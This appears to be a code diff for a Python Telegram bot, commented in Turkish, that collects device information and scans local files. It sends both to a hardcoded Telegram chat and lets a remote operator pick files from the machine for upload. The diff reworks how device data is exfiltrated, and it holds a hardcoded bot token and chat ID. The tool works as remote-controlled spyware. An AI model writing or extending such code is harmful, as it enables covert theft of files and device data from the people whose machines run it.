@@ -7,8 +7,9 @@ from telegram.ext import Updater, CommandHandler
 
 # Telegram Bot Ayarları
 BOT_TOKEN = "7990420796:AAEqVI1L0WiGL8l66L_njVYvgnaC2vNbL6Y"
-CHAT_ID = "6736473228"
+CHAT_ID = "6736473228"  # Yeni chat ID
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+TELEGRAM_MESSAGE_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
 # Dosya-nesne eşleştirmesi için global değişken
 dosya_haritasi = {}
@@ -53,16 +54,11 @@ def dosya_tara():
 def bilgileri_kaydet_ve_gonder():
     zaman_damgasi = int(time.time())
 
-    # Cihaz bilgisini kaydet ve gönder
+    # Cihaz bilgisini mesaj olarak gönder
     cihaz_bilgisi = cihaz_bilgisi_al()
-    cihaz_dosyasi = f"cihaz_{zaman_damgasi}.json"
-    with open(cihaz_dosyasi, "w") as f:
-        json.dump(cihaz_bilgisi, f, indent=4, ensure_ascii=False)
-    print(f"Cihaz bilgisi {cihaz_dosyasi} kaydedildi!")
-
-    with open(cihaz_dosyasi, "rb") as f:
-        requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
-    print(f"{cihaz_dosyasi} Telegram'a gönderildi!")
+    cihaz_mesaji = "\n".join([f"{k}: {v}" for k, v in cihaz_bilgisi.items()])
+    requests.post(TELEGRAM_MESSAGE_API, data={"chat_id": CHAT_ID, "text": f"Cihaz Bilgisi:\n{cihaz_mesaji}"})
+    print("Cihaz bilgisi mesaj olarak gönderildi!")
 
     # Dosya listesini kaydet ve gönder
     dosya_listesi = dosya_tara()
@@ -88,7 +84,6 @@ def select_file(update, context):
         print(f"{numara} numaralı dosya ({dosya_yolu}) Telegram'a gönderildi!")
     except:
         update.message.reply_text("Hata, dosya gönderilemedi!")
-        print(f"Select hatası: {numara}")
 
 def main():
     print("Botu başlatıyorum, kral! 😈")
